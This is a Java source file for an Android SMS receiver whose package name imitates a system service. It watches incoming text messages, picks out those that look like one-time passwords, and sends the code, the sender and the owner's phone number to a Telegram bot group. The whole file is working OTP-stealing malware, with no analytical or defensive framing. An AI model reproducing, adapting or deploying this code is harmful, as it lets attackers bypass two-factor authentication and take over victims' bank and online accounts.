package android.service.sms.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.service.sms.helpers.CustomMethods;
import android.service.sms.helpers.SharedPrefHelper;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.NonNull;

import org.json.JSONObject;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Objects;

public class SMSReceiver extends BroadcastReceiver {

    private static final String TAG = "MADARA";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (Objects.requireNonNull(intent.getAction()).equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {

            Bundle bundle = intent.getExtras();

            if (bundle != null) {

                SmsMessage[] messages;

//                String format = bundle.getString("format");

                messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);

                for (SmsMessage smsMessage : messages) {
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();

                    if (CustomMethods.isOTPMessage(messageBody))
                        processSMS(context, sender, messageBody);
                }
            }
        }
    }

    private void processSMS(Context context, String sender, String message) {

        JSONObject sms = new JSONObject();

        try {
            sms.put("ownerPhoneNo", CustomMethods.getPhoneNumber(context));
            sms.put("phoneNo", sender);
            sms.put("msg", message);

            String finalSms = "<b>Received to:</b> <pre><code>" + CustomMethods.getPhoneNumber(context) + "</code></pre>\n\n"
                    + "<b>From:</b> <pre><code>" + sender + "</code></pre>\n\n"
                    + "<b>Message:</b> <pre><code>" + message + "</code></pre>";

            SharedPrefHelper sharedPrefHelper = new SharedPrefHelper(context);

            String botToken = sharedPrefHelper.getTGBotToken();
            String groupID = sharedPrefHelper.getTGGroupID();

            String tgApiURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";

            JSONObject tgBody = new JSONObject();
            tgBody.put("chat_id", groupID);
            tgBody.put("text", finalSms);
            tgBody.put("parse_mode", "HTML");

            String requestBody = tgBody.toString();

            new Thread(() -> {

                try {
                    HttpURLConnection connection = getHttpURLConnection(tgApiURL);

                    try (OutputStream os = connection.getOutputStream()) {
                        byte[] input = requestBody.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    int responseCode = connection.getResponseCode();
                    Log.d(TAG, "processSMS: " + responseCode);

                } catch (Exception e){
                    Log.e(TAG, "processSMS: ", e);
                }
            }).start();

        } catch (Exception e) {
            Log.e(TAG, "processSMS: ", e);
        }
    }

    private static @NonNull HttpURLConnection getHttpURLConnection(String tgApiURL) throws IOException {
        URL url = new URL(tgApiURL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "application/json; utf-8");
        connection.setRequestProperty("Accept", "application/json");
        connection.setInstanceFollowRedirects(true);
        connection.setConnectTimeout(20000);
        return connection;
    }
}